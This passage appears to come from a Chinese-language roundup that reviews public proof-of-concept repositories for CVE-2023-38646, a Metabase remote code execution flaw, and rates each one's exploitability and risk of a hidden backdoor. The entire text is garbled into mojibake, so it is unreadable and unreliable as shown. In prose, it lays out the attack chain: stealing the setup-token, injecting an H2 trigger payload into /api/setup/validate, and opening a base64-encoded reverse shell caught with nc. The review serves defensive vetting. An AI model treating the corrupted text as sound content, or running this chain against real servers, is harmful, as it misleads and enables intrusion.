    è™½ç„¶æä¾›çš„ä»£ç ä¸»è¦æ˜¯ç”¨äºæ¼æ´åˆ©ç”¨ï¼Œä½†ä»å­˜åœ¨è½»å¾®çš„æŠ•æ¯’é£é™©ã€‚é£é™©ç‚¹ä¸»è¦å­˜åœ¨äº`CVE-2023-38646.py`è„šæœ¬ä¸­çš„`payload`å˜é‡ã€‚å½“å‰çš„`payload`ç”¨äºåˆ›å»ºä¸€ä¸ªåå‘shellè¿æ¥ï¼Œè™½ç„¶æœ¬èº«ä¸æ˜¯æ¶æ„ä»£ç ï¼Œä½†å¯èƒ½è¢«ä¿®æ”¹ä¸ºæ‰§è¡Œæ›´å…·ç ´åæ€§çš„æ“ä½œã€‚å¦å¤–ï¼Œä½œè€…æä¾›çš„githubé“¾æ¥ä¸­çš„å›¾ç‰‡å¯èƒ½æ˜¯ç»è¿‡ä¿®æ”¹çš„ã€‚
    æ€»ä½“è€Œè¨€ï¼ŒæŠ•æ¯’é£é™©è¾ƒä½ï¼Œä½†éœ€è¦ä»”ç»†å®¡æŸ¥ä»£ç ï¼Œç¡®ä¿å…¶æ²¡æœ‰è¢«ç¯¡æ”¹æˆ–æ·»åŠ æ¶æ„åŠŸèƒ½ã€‚


**é¡¹ç›®åœ°å€:** [Ego1stoo/CVE-2023-38646](https://github.com/Ego1stoo/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #8

**æ¥æº**: [CVE-2023-38646-JayRyz_CVE-2023-38646-PoC-Metabase.md](../2023/CVE-2023-38646-JayRyz_CVE-2023-38646-PoC-Metabase.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ(RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** Metabase open source < 0.46.6.1 å’Œ Metabase Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹è¿è¡Œåœ¨å—å½±å“ç‰ˆæœ¬ï¼Œä¸”ç½‘ç»œå¯è¾¾ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 æ¼æ´å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨MetabaseæœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢å¼•æ“ç»“æœï¼Œæ­¤æ¼æ´å½±å“Metabaseå¼€æºç‰ˆæœ¬ä½äº0.46.6.1å’ŒMetabaseä¼ä¸šç‰ˆæœ¬ä½äº1.46.6.1ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **è·å–Setup Tokenï¼š** åˆ©ç”¨ PoC ä»£ç ä¸­çš„ `get_token` å‡½æ•°ï¼Œé€šè¿‡è®¿é—® `/api/session/properties` æ¥å£è·å– setup-tokenã€‚
2.  **æ„é€ æ¶æ„Payloadï¼š** åˆ©ç”¨è·å–çš„ setup-token, æ„é€ åŒ…å«æ¶æ„å‘½ä»¤çš„payloadã€‚PoC ä»£ç ä½¿ç”¨ H2 æ•°æ®åº“çš„ç‰¹æ€§ï¼Œåœ¨æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ä¸­åµŒå…¥æ¶æ„ SQL è¯­å¥ï¼Œè¯¥è¯­å¥åˆ›å»ºä¸€ä¸ªè§¦å‘å™¨ï¼ˆTRIGGERï¼‰ï¼Œåœ¨è§¦å‘å™¨ä¸­æ‰§è¡Œå‘½ä»¤ã€‚å‘½ä»¤ä½¿ç”¨äº†åå¼¹shellçš„æŠ€æœ¯ã€‚ é¦–å…ˆå°†è¦æ‰§è¡Œçš„shellå‘½ä»¤è¿›è¡Œbase64ç¼–ç , ç„¶ååˆ©ç”¨`java.lang.Runtime.getRuntime().exec()` æ¥æ‰§è¡Œå‘½ä»¤ã€‚
3.  **å‘é€Exploitï¼š** é€šè¿‡ POST è¯·æ±‚å°†æ„é€ çš„ payload å‘é€åˆ° Metabase æœåŠ¡å™¨ã€‚
4.  **åå¼¹ Shellï¼š** æ”»å‡»è€…ä½¿ç”¨ `nc` ç›‘å¬æŒ‡å®šç«¯å£ï¼Œç­‰å¾…ç›®æ ‡æœåŠ¡å™¨æ‰§è¡Œå‘½ä»¤ååå¼¹ shellã€‚

**æœ‰æ•ˆæ€§ï¼š**

æ ¹æ®æä¾›çš„æ¼æ´ä¿¡æ¯å’ŒPoCä»£ç ï¼Œæ­¤æ¼æ´çš„åˆ©ç”¨æ˜¯æœ‰æ•ˆçš„ã€‚æ¼æ´åº“ä¿¡æ¯æ˜ç¡®æŒ‡å‡ºæ— éœ€èº«ä»½éªŒè¯å³å¯åˆ©ç”¨æ­¤æ¼æ´æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æœç´¢å¼•æ“ç»“æœä¸­ä¹ŸåŒ…å«å¤§é‡å…³äºæ­¤æ¼æ´çš„åˆ†æå’Œåˆ©ç”¨æ–‡ç« ï¼Œè¿›ä¸€æ­¥éªŒè¯äº†å…¶æœ‰æ•ˆæ€§ã€‚PoCä»£ç æä¾›äº†è‡ªåŠ¨åŒ–åˆ©ç”¨çš„è„šæœ¬ã€‚

**æŠ•æ¯’é£é™©ï¼š**

æä¾›çš„ PoC ä»£ç ä¸­å­˜åœ¨æ½œåœ¨çš„æŠ•æ¯’é£é™©ã€‚è™½ç„¶ä¸»è¦åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´ï¼Œä½†ä»£ç ä¸­å¯èƒ½åŒ…å«ä»¥ä¸‹æ½œåœ¨é£é™©ï¼š

*   **åå¼¹ Shell åœ°å€ï¼š** PoC ä»£ç å…è®¸ç”¨æˆ·æŒ‡å®šåå¼¹ shell çš„ IP åœ°å€å’Œç«¯å£ï¼Œä½†å¦‚æœç”¨æˆ·ä¸å°å¿ƒä½¿ç”¨äº†æ”»å‡»è€…æ§åˆ¶çš„ IP åœ°å€å’Œç«¯å£ï¼Œå¯èƒ½ä¼šè¢«åå¼¹ shellï¼Œå¯¼è‡´è‡ªèº«ç³»ç»Ÿè¢«æ”»å‡»è€…æ§åˆ¶ã€‚
*   **å…¶ä»–æ¶æ„å‘½ä»¤ï¼š**  æ”»å‡»è€…å¯èƒ½ä¼šä¿®æ”¹ PoC ä»£ç ï¼Œæ·»åŠ é¢å¤–çš„æ¶æ„å‘½ä»¤ï¼Œä¾‹å¦‚åˆ é™¤æ–‡ä»¶ã€ä¿®æ”¹ç³»ç»Ÿé…ç½®ç­‰ã€‚ä»£ç ä¸­çš„`convert_command`å‡½æ•°å’Œ`create_payload`å‡½æ•°å¯ä»¥è¢«ä¿®æ”¹æ³¨å…¥æ¶æ„ä»£ç ã€‚
*   **ä¾èµ–é¡¹é£é™©ï¼š** è™½ç„¶PoCä»£ç ä¾èµ–çš„requestsåº“æœ¬èº«é£é™©è¾ƒä½ï¼Œä½†æ˜¯å¦‚æœæ”»å‡»è€…æä¾›ä¿®æ”¹è¿‡çš„poc,å¢åŠ å…¶ä»–æ¶æ„ä¾èµ–åº“, å¯èƒ½ä¼šå­˜åœ¨å®‰å…¨é£é™©ã€‚

ç»¼åˆåˆ†æï¼ŒæŠ•æ¯’é£é™©è¯„ä¼°ä¸º 10%ï¼Œä¸»è¦é£é™©é›†ä¸­åœ¨ç”¨æˆ·é”™è¯¯ä½¿ç”¨æˆ–æ¶æ„ä¿®æ”¹ PoC ä»£ç çš„å¯èƒ½æ€§ä¸Šã€‚

**é¡¹ç›®åœ°å€:** [JayRyz/CVE-2023-38646-PoC-Metabase](https://github.com/JayRyz/CVE-2023-38646-PoC-Metabase)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #9

**æ¥æº**: [CVE-2023-38646-Mrunalkaran_CVE-2023-38646.md](../2023/CVE-2023-38646-Mrunalkaran_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ(RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…ä»¥æœåŠ¡å™¨æƒé™æ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** Metabase open source versions before 0.46.6.1 and Metabase Enterprise versions before 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹è¿è¡Œåœ¨å—å½±å“çš„ç‰ˆæœ¬ï¼Œä¸”ç½‘ç»œå¯è¾¾ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 1%

## è¯¦æƒ…

CVE-2023-38646æ˜¯ä¸€ä¸ªå­˜åœ¨äºMetabase 0.46.6.1ä¹‹å‰ç‰ˆæœ¬å’ŒMetabase Enterprise 1.46.6.1ä¹‹å‰ç‰ˆæœ¬çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚æ”»å‡»è€…æ— éœ€èº«ä»½éªŒè¯å³å¯åˆ©ç”¨æ­¤æ¼æ´ï¼Œé€šè¿‡ç²¾å¿ƒæ„é€ çš„è¯·æ±‚ï¼Œåœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œä»è€Œå®Œå…¨æ§åˆ¶ç³»ç»Ÿã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **è·å–Setup Token:** POCè„šæœ¬é¦–å…ˆå°è¯•ä»`/api/session/properties`ç«¯ç‚¹è·å–setup-tokenï¼Œè¿™ä¸ªtokenç”¨äºåç»­çš„åˆ©ç”¨ã€‚
2.  **æ„é€ æ¶æ„Payload:**  è„šæœ¬æ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„H2æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²çš„JSON payloadã€‚è¯¥è¿æ¥å­—ç¬¦ä¸²åˆ©ç”¨H2æ•°æ®åº“çš„ç‰¹æ€§ï¼Œåœ¨è¿æ¥æ—¶æ‰§è¡Œä»»æ„Javaä»£ç ã€‚å…·ä½“æ¥è¯´ï¼Œå®ƒåˆ›å»ºäº†ä¸€ä¸ªè§¦å‘å™¨ï¼Œåœ¨è®¿é—® `INFORMATION_SCHEMA.TABLES` è¡¨æ—¶æ‰§è¡Œä¸€æ®µ JavaScript ä»£ç ã€‚
3.  **æ‰§è¡Œå‘½ä»¤:**  JavaScript ä»£ç è°ƒç”¨ `java.lang.Runtime.getRuntime().exec()` æ¥æ‰§è¡Œä¸€ä¸ªåŒ…å«base64ç¼–ç çš„bashå‘½ä»¤ã€‚æ­¤å‘½ä»¤è§£ç å¹¶æ‰§è¡Œåå‘shellå‘½ä»¤ã€‚
4.  **å‘é€Payload:**  æ„é€ å¥½çš„payloadé€šè¿‡POSTè¯·æ±‚å‘é€åˆ°`/api/setup/validate`ç«¯ç‚¹ã€‚
5.  **åå‘Shell:**  å¦‚æœæ¼æ´åˆ©ç”¨æˆåŠŸï¼Œæ”»å‡»è€…å°†åœ¨æŒ‡å®šçš„IPåœ°å€å’Œç«¯å£ä¸Šè·å¾—ä¸€ä¸ªåå‘shellã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

æä¾›çš„ä»£ç ä¸»è¦æ˜¯åˆ©ç”¨æ¼æ´è·å–åå‘shellã€‚é€šè¿‡æ£€æŸ¥ä»£ç ï¼Œæ²¡æœ‰å‘ç°æ˜æ˜¾çš„æ¶æ„ä»£ç ï¼Œä¾‹å¦‚åˆ é™¤æ–‡ä»¶ã€ä¼ æ’­æ¶æ„è½¯ä»¶ç­‰ã€‚ä»£ç ç»“æ„æ¸…æ™°ï¼Œç›®çš„æ˜¯åˆ©ç”¨æ¼æ´ã€‚è™½ç„¶ä»£ç æœ¬èº«æ˜¯ä¸ºäº†æ”»å‡»ï¼Œä½†å®ƒæ²¡æœ‰ä¸»åŠ¨è¿›è¡Œæ¶æ„ä¼ æ’­æˆ–å…¶ä»–ç ´åè¡Œä¸ºã€‚è€ƒè™‘åˆ°ä»£ç çš„åŠŸèƒ½ä¸»è¦æ˜¯æ¼æ´åˆ©ç”¨ï¼Œè€Œéæ¤å…¥åé—¨æˆ–è¿›è¡Œå…¶ä»–æ¶æ„æ´»åŠ¨ï¼Œå› æ­¤åˆ¤å®šå­˜åœ¨æŠ•æ¯’ä»£ç çš„å¯èƒ½æ€§è¾ƒä½ã€‚

è¯¥é¡¹ç›®ä¸­å¯èƒ½å­˜åœ¨æŠ•æ¯’çš„é£é™©è¾ƒä½ï¼Œè¯„ä¼°ç»“æœä¸º1%ã€‚

**é¡¹ç›®åœ°å€:** [Mrunalkaran/CVE-2023-38646](https://github.com/Mrunalkaran/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #10

**æ¥æº**: [CVE-2023-38646-Pyr0sec_CVE-2023-38646.md](../2023/CVE-2023-38646-Pyr0sec_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 (Open Source) å’Œ < 1.46.6.1 (Enterprise)

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡ç³»ç»Ÿè¿è¡Œå—å½±å“ç‰ˆæœ¬çš„Metabaseï¼Œä¸”æ”»å‡»è€…èƒ½å¤Ÿé€šè¿‡ç½‘ç»œè®¿é—®è¯¥Metabaseå®ä¾‹ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 2%

## è¯¦æƒ…

CVE-2023-38646æ˜¯ä¸€ä¸ªå­˜åœ¨äºMetabaseçš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢å¼•æ“ç»“æœï¼Œè¯¥æ¼æ´å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨å—å½±å“çš„MetabaseæœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚å¤šä¸ªä¿¡æ¯æ¥æºéƒ½ç¡®è®¤äº†æ­¤æ¼æ´çš„å­˜åœ¨å’Œé«˜å±æ€§ï¼Œå¹¶æä¾›äº†å¯åˆ©ç”¨çš„POCã€‚æ¼æ´åˆ©ç”¨æ–¹å¼é€šå¸¸æ¶‰åŠæ„é€ æ¶æ„çš„è¯·æ±‚ï¼Œè§¦å‘Metabaseä¸­çš„ååºåˆ—åŒ–æˆ–å…¶ä»–ç±»å‹çš„æ¼æ´ï¼Œä»è€Œæ‰§è¡Œæ”»å‡»è€…æä¾›çš„æ¶æ„ä»£ç ã€‚

**æœ‰æ•ˆæ€§ï¼š** æ¼æ´åº“ä¿¡æ¯å’Œå¤šä¸ªæœç´¢å¼•æ“ç»“æœè¡¨æ˜å­˜åœ¨å…¬å¼€å¯ç”¨çš„PoCï¼Œè¯æ˜äº†æ¼æ´çš„å¯åˆ©ç”¨æ€§ã€‚

**æŠ•æ¯’é£é™©ï¼š** æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç åªåŒ…å«Apache Licenseã€‚å¹¶æ²¡æœ‰å‘ç°ä»»ä½•ç›´æ¥çš„æŠ•æ¯’ä»£ç ã€‚é€šå¸¸ï¼ŒæŠ•æ¯’å¯èƒ½å­˜åœ¨äºæ›´å¤æ‚çš„expæˆ–è€…åº“çš„ä¾èµ–ä¸­,ä¾‹å¦‚ï¼Œä¸€äº›å¼€å‘è€…å¯èƒ½åœ¨çœ‹ä¼¼æ— å®³çš„ä»£ç ä¸­åµŒå…¥åé—¨ï¼Œè¿™äº›åé—¨åœ¨ç‰¹å®šæ¡ä»¶ä¸‹è¢«è§¦å‘ï¼Œä»è€Œå…è®¸æ”»å‡»è€…è¿œç¨‹æ§åˆ¶å—æ„ŸæŸ“çš„ç³»ç»Ÿã€‚æœ¬æ¬¡PoCçš„æŠ•æ¯’åˆ†æå æ¯”ä¸º2%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **ç¡®å®šç›®æ ‡ï¼š** ç¡®å®šè¿è¡ŒMetabaseçš„æœåŠ¡å™¨ï¼Œå¹¶ç¡®è®¤å…¶ç‰ˆæœ¬æ˜¯å¦åœ¨å—å½±å“çš„èŒƒå›´å†…ï¼ˆä½äº0.46.6.1çš„å¼€æºç‰ˆæœ¬æˆ–ä½äº1.46.6.1çš„ä¼ä¸šç‰ˆæœ¬ï¼‰ã€‚
2.  **æ„é€ æ¶æ„è¯·æ±‚ï¼š** ä½¿ç”¨å·²çŸ¥çš„PoCæˆ–expæ„é€ åŒ…å«æ¶æ„ä»£ç çš„è¯·æ±‚ã€‚å…·ä½“çš„è¯·æ±‚æ ¼å¼å–å†³äºæ¼æ´çš„ç»†èŠ‚ï¼Œå¯èƒ½æ¶‰åŠå‘é€ç‰¹åˆ¶çš„JSONæ•°æ®ã€åˆ©ç”¨SQLæ³¨å…¥æˆ–å…¶ä»–ç±»å‹çš„æ¼æ´ã€‚
3.  **å‘é€è¯·æ±‚ï¼š** å°†æ„é€ çš„æ¶æ„è¯·æ±‚å‘é€åˆ°MetabaseæœåŠ¡å™¨çš„ç‰¹å®šç«¯ç‚¹ã€‚
4.  **æ‰§è¡Œä»£ç ï¼š** å¦‚æœæ¼æ´åˆ©ç”¨æˆåŠŸï¼ŒMetabaseæœåŠ¡å™¨å°†æ‰§è¡Œæ”»å‡»è€…æä¾›çš„æ¶æ„ä»£ç ï¼Œä»è€Œå…è®¸æ”»å‡»è€…æ§åˆ¶æœåŠ¡å™¨ã€‚


**é¡¹ç›®åœ°å€:** [Pyr0sec/CVE-2023-38646](https://github.com/Pyr0sec/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #11

**æ¥æº**: [CVE-2023-38646-Red4mber_CVE-2023-38646.md](../2023/CVE-2023-38646-Red4mber_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ(RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 (å¼€æºç‰ˆ), < 1.46.6.1 (ä¼ä¸šç‰ˆ)

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹ç‰ˆæœ¬åœ¨å—å½±å“èŒƒå›´å†…ï¼Œä¸”æœªè¿›è¡Œç›¸åº”è¡¥ä¸ä¿®å¤ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 1%

## è¯¦æƒ…

CVE-2023-38646 æ˜¯ Metabase ä¸­çš„ä¸€ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ ç‰¹æ®Šçš„è¯·æ±‚åˆ©ç”¨æ­¤æ¼æ´åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **è·å– Setup Tokenï¼š** æ”»å‡»è€…é¦–å…ˆå‘ `/api/session/properties` ç«¯ç‚¹å‘é€ GET è¯·æ±‚ï¼Œä»¥è·å– `setup-token`ã€‚è¿™ä¸ªtokenç”¨äºåç»­çš„åˆ©ç”¨ã€‚
2.  **æ„é€ æ¶æ„è¯·æ±‚ï¼š** æ”»å‡»è€…æ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„ SQL æ³¨å…¥çš„ JSON payloadï¼Œå¹¶å°†å…¶å‘é€åˆ° `/api/setup/validate` ç«¯ç‚¹ã€‚
    *   Payload çš„ `details` å­—æ®µåŒ…å«ä¸€ä¸ªæ¶æ„çš„ H2 æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ï¼Œå…¶ä¸­ `TRACE_LEVEL_SYSTEM_OUT=1` å¼€å¯äº†è·Ÿè¸ªï¼Œ`CREATE TRIGGER` ç”¨äºåˆ›å»ºä¸€ä¸ªè§¦å‘å™¨ï¼Œåœ¨è®¿é—® `INFORMATION_SCHEMA.TABLES` è¡¨æ—¶æ‰§è¡Œ JavaScript ä»£ç ã€‚
    *   JavaScript ä»£ç ä½¿ç”¨ `java.lang.Runtime.getRuntime().exec()` æ‰§è¡Œç»è¿‡ Base64 ç¼–ç çš„å‘½ä»¤ã€‚
3.  **æ‰§è¡Œå‘½ä»¤ï¼š** å½“ Metabase å°è¯•éªŒè¯æ•°æ®åº“è¿æ¥æ—¶ï¼Œæ¶æ„ SQL æ³¨å…¥ä¼šè¢«è§¦å‘ï¼Œä»è€Œæ‰§è¡Œæ”»å‡»è€…æä¾›çš„å‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§è¯„ä¼°ï¼š**

æä¾›çš„PoCä»£ç æœ‰æ•ˆã€‚ä»£ç é€šè¿‡å‘é€æ¶æ„è¯·æ±‚åˆ° `/api/setup/validate` æ¥å£æ¥è§¦å‘æ¼æ´ã€‚ä»£ç é¦–å…ˆé€šè¿‡`/api/session/properties`è·å–tokenï¼Œç„¶åä½¿ç”¨åŒ…å«æ¶æ„SQLæ³¨å…¥çš„JSONæ•°æ®åŒ…é€šè¿‡POSTæ–¹æ³•å‘é€åˆ°ç›®æ ‡æœåŠ¡å™¨ã€‚

**æŠ•æ¯’é£é™©è¯„ä¼°ï¼š**

è¯¥POCä»£ç ä¸»è¦åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´å®ç°RCEï¼Œæ²¡æœ‰æ˜æ˜¾çš„æŠ•æ¯’è¡Œä¸ºã€‚
è™½ç„¶å­˜åœ¨æ‰§è¡Œä»»æ„å‘½ä»¤çš„é£é™©ï¼Œä½†æ˜¯payloadæ˜¯ç”±ä½¿ç”¨è€…æä¾›çš„ã€‚ä»£ç æœ¬èº«åªè´Ÿè´£æ„é€ å’Œå‘é€è¯·æ±‚ï¼Œé£é™©æ˜¯RCEæœ¬èº«å¸¦æ¥çš„ï¼Œè€Œä¸æ˜¯ä»£ç ä½œè€…æ¤å…¥çš„åé—¨ã€‚
å­˜åœ¨æä½çš„æŠ•æ¯’é£é™© (å¤§çº¦1%)ï¼Œè¯¥é£é™©æ¥è‡ªäºä½œè€…å¯èƒ½ä¼šåœ¨ä»£ç é€»è¾‘ä¸Šå­˜åœ¨ä¸€äº›éšè—çš„åé—¨ï¼Œä½†æ˜¯ä»£ç æ•´ä½“ç»“æ„å’Œé€»è¾‘éƒ½æ¯”è¾ƒç®€å•ï¼Œéšè—åé—¨çš„éš¾åº¦è¾ƒé«˜ã€‚


**é¡¹ç›®åœ°å€:** [Red4mber/CVE-2023-38646](https://github.com/Red4mber/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #12

**æ¥æº**: [CVE-2023-38646-Shisones_MetabaseRCE_CVE-2023-38646.md](../2023/CVE-2023-38646-Shisones_MetabaseRCE_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…ä»¥æœåŠ¡å™¨æƒé™æ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** Metabase open source before 0.46.6.1 and Metabase Enterprise before 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹å¯è¢«ç½‘ç»œè®¿é—®

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨å—å½±å“çš„ Metabase å®ä¾‹ä¸Šæ‰§è¡Œè¿œç¨‹ä»£ç ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯ã€æœç´¢ç»“æœå’Œæ¼æ´åˆ©ç”¨ä»£ç ï¼Œæ­¤æ¼æ´åˆ©ç”¨æœ‰æ•ˆã€‚åˆ©ç”¨æ–¹å¼æ¶‰åŠå‘é€ç‰¹åˆ¶çš„è¯·æ±‚åˆ° Metabase æœåŠ¡å™¨ï¼Œåˆ©ç”¨å…¶å­˜åœ¨çš„æ¼æ´æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§ï¼š**

æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢ç»“æœï¼Œè¯¥æ¼æ´å·²ç¡®è®¤å¹¶ä¸”å­˜åœ¨å¯åˆ©ç”¨çš„PoCã€‚æœç´¢å¼•æ“ç»“æœä¸­å¤šä¸ªé“¾æ¥æŒ‡å‘äº†æ¼æ´çš„è¯¦ç»†æè¿°ã€åˆ©ç”¨æ–¹æ³•å’ŒPoCä»£ç ï¼Œè¯æ˜äº†å…¶æœ‰æ•ˆæ€§ã€‚

**æŠ•æ¯’é£é™©ï¼š**

æä¾›çš„Cargo.lockæ–‡ä»¶åªæ˜¯Rusté¡¹ç›®çš„ä¾èµ–é”å®šæ–‡ä»¶ï¼Œæœ¬èº«ä¸åŒ…å«å¯æ‰§è¡Œä»£ç ã€‚è¯„ä¼°æŠ•æ¯’é£é™©éœ€è¦æŸ¥çœ‹å®Œæ•´çš„æºä»£ç ï¼Œä½†ä»…å‡­Cargo.lockæ–‡ä»¶å¾ˆéš¾åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ¶æ„ä»£ç ã€‚è€ƒè™‘åˆ°ç¼ºä¹ç›´æ¥çš„æ¶æ„ä»£ç è¯æ®ï¼Œä»¥åŠæ¼æ´åˆ©ç”¨ä¸»è¦ä¾èµ–äºMetabaseæœ¬èº«çš„æ¼æ´ï¼ŒæŠ•æ¯’é£é™©è¾ƒä½ï¼Œä¼°è®¡ä¸º10%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

æ ¹æ®æœç´¢ç»“æœï¼Œæ”»å‡»è€…åˆ©ç”¨æ­¤æ¼æ´ï¼Œé€šè¿‡å‘é€ç‰¹åˆ¶çš„æ¶æ„è¯·æ±‚åˆ°MetabaseæœåŠ¡å™¨ï¼Œä»è€Œæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ— éœ€èº«ä»½éªŒè¯å³å¯è§¦å‘æ­¤æ¼æ´ã€‚


**é¡¹ç›®åœ°å€:** [Shisones/MetabaseRCE_CVE-2023-38646](https://github.com/Shisones/MetabaseRCE_CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #13

**æ¥æº**: [CVE-2023-38646-UserConnecting_Exploit-CVE-2023-38646-Metabase.md](../2023/CVE-2023-38646-UserConnecting_Exploit-CVE-2023-38646-Metabase.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæ— éœ€èº«ä»½éªŒè¯å³å¯æ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** 0.46.6.1ä¹‹å‰ (å¼€æºç‰ˆ), 1.46.6.1ä¹‹å‰ (ä¼ä¸šç‰ˆ)

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹ç‰ˆæœ¬å—å½±å“ï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡ç½‘ç»œè®¿é—®ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 1%

## è¯¦æƒ…

